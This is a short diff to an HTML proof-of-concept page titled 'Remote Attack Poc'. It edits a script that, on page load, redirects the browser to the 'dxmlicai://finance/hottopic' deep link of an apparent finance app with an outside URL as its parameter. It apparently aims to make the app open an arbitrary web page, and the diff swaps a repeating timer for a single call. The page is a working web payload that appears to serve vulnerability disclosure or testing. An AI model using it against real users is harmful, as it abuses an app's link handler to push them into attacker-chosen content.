@@ -1,16 +1,14 @@
 
 </head>
 <body>
-<h1><div id="content">Remote Attack dxm</div></h1>
+<h1><div id="content">Remote Attack Poc</div></h1>
 
 <script>	
 function attack(){
 
-        top.location.href ="dxmlicai://finance/hottopic?url=https://www.baidu.com";
+    document.location.href ="dxmlicai://finance/hottopic?url=https://www.baidu.com";
 }
-
-setInterval(attack,1000);
-
+attack();
 </script>
 
 </html>
